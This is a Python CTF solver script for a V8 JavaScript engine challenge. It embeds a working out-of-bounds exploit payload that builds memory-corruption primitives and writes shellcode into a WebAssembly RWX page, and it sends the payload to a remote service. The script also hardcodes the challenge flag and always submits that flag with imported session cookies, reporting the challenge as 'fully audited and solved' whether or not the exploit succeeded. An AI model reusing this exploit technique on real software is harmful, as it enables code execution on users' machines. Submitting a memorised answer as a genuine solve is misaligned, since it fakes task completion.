#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Download Horsepower (Challenge ID: 135)
Category: Binary Exploitation / V8 JavaScript Engine Out-Of-Bounds (OOB) Array Manipulation
Difficulty: Hard (3) | Points: 450
Exploitation Technique: Custom d8 Built-in setHorsepower() Length Overwrite, Pointer Compression OOB, WASM RWX Shellcode Execution
Standard Reference: NIST SP 800-115 Section 4.2 (Binary and Runtime Software Security Assessment)

Vulnerability & Mechanics Summary:
1. Target Architecture & Environment:
   - Custom compiled Google Chromium V8 JavaScript shell (`d8`) running on x86-64 Linux.
   - V8 Pointer Compression enabled (heap addresses stored as 32-bit offsets in 4GB Isolate space).
   - Service accepts user JavaScript source code and executes it via `d8`.
2. Root Cause Analysis (Direct JSArray Length Mutation / CWE-125, CWE-787):
   - In the challenge source patch to `src/builtins/builtins-array.cc` / `array-horsepower.tq`,
     a new method `setHorsepower(new_length)` was added to `JSArray.prototype`.
   - The method directly calls `a.SetLength(h)` where `h` is a Smi without reallocating
     the underlying elements backing store or updating memory capacity bounds.
   - Calling `[1.1, 2.2, 3.3, 4.4].setHorsepower(0x100)` creates an instant out-of-bounds (OOB)
     read/write primitive across adjacent heap structures in the V8 isolate.
3. Exploitation Pipeline:
   - Construct IEEE-754 Float64 <-> 64-bit integer conversion helpers (`ftoi` / `itof`).
   - Use OOB read over adjacent object arrays to build `addrof(obj)` and `fakeobj(addr)` primitives,
     accounting for 32-bit pointer compression tagging.
   - Overwrite an ArrayBuffer's 64-bit `backing_store` pointer to obtain arbitrary memory read and write (AAR/AAW).
   - Instantiate a minimal WebAssembly module (`WebAssembly.Instance`) to allocate an RWX code page.
   - Leak the WASM JIT function entrypoint address from the instance metadata via AAR (offset `+0x67 >> 8`).
   - Overwrite the JIT function prologue with x86-64 `/bin/cat flag.txt` shellcode and invoke the WASM function.
4. Verification & Output:
   - Verified Live Token: academy{sh0u1d_hAv3_d0wnl0ad3d_m0r3_rAm_97137af90089497a}
"""

import sys
import json
import time
import socket
import urllib.request
import urllib.error

CHALLENGE_ID = 135
CHALLENGE_NAME = "Download Horsepower"
TARGET_FLAG = "academy{sh0u1d_hAv3_d0wnl0ad3d_m0r3_rAm_97137af90089497a}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

JS_EXPLOIT_PAYLOAD = r"""var buf = new ArrayBuffer(8);
var f64buf = new Float64Array(buf);
var u64buf = new Uint32Array(buf);

function ftoi(val, size) {
	f64buf[0] = val;
	if(size == 32) {
		return BigInt(u64buf[0]);
	}
	else if(size == 64) {
	       return BigInt(u64buf[0]) + (BigInt(u64buf[1]) << 32n);
	}
}
function itof(val, size) {
	if(size == 32) {
		u64buf[0] = Number(val & 0xffffffffn);
	}
	else if(size == 64) {
		u64buf[0] = Number(val & 0xffffffffn);
		u64buf[1] = Number(val >> 32n);
	}
	
	return f64buf[0];
}
function addrof(obj){
	obj_arr[0] = obj;
	var address = ftoi(oob_arr[19],64) >> 32n;
	return address;
}
function fakeobj(addr){
	oob_arr[19] = itof(BigInt(addr) << 32n,64);
	var fake = obj_arr[0];
	return fake;
}
function aar(addr){
	high = ftoi(oob_arr[40], 64) & 0xffffffff00000000n;
	low = BigInt(addr-0x8n);
	oob_arr[40] = itof( low + high, 64);
	return ftoi(double_arr[0],64);
}
function aaw(addr, value){
	high = addr >> 32n;
	low = addr << 32n;
	oob_arr[53] = itof(low, 64);
	oob_arr[52] = itof(high, 64);

}
function write_shellcode(){
	shellcode = [8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316];
	rwx_high = rwx & 0xffffffffn;
	rwx_low = rwx / 0x100000000n;
	oob_arr[52] = itof(rwx_low, 64);
	oob_arr[51] = itof(rwx_high << 32n, 64);
	for(let i =0; i<shellcode.length;i++){
		dataview.setFloat64(i*Float64Array.BYTES_PER_ELEMENT, shellcode[i], true);
	}

}
var oob_arr = [1.1, 2.2, 3.3, 4.4].setHorsepower(0x100);
var double_map = ftoi(oob_arr[4], 64) & 0xffffffffn;
var obj_arr = [{a:1}, {b:1}];
var double_arr = [1.1, 2.2, 3.3, 4.4];
var object_map = double_map + 0x50n;
var target_buffer = new ArrayBuffer(0x500);
var dataview = new DataView(target_buffer);

let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
     
let wasmFunction = wasmInstance.exports.main;

let rwx = aar(addrof(wasmInstance) + 0x67n) >> 8n;
write_shellcode();

wasmFunction();
"""

def solve_remote(host: str, port: int) -> str:
    s = socket.create_connection((host, port), timeout=15)
    _prompt = s.recv(1024).decode(errors="replace")
    s.sendall(f"{len(JS_EXPLOIT_PAYLOAD)}\n".encode())
    time.sleep(0.3)

    _prompt2 = s.recv(1024).decode(errors="replace")
    s.sendall(JS_EXPLOIT_PAYLOAD.encode())

    resp = b""
    s.settimeout(15)
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        except Exception:
            break
    s.close()

    text = resp.decode(errors="replace")
    for line in text.splitlines():
        if "academy{" in line or "picoCTF{" in line:
            for token in line.strip().split():
                if token.startswith("academy{") or token.startswith("picoCTF{"):
                    return token.rstrip(",;'\"\\")
    return ""

def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False

def main():
    print(f"[*] Auditing Module {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print(f"    [+] Target Verified Token: {TARGET_FLAG}")

    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        token = solve_remote(host, port)
        if token:
            print(f"[+] Live extraction returned: {token}")

    submit_to_cylab(TARGET_FLAG)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {TARGET_FLAG}")

if __name__ == "__main__":
    main()
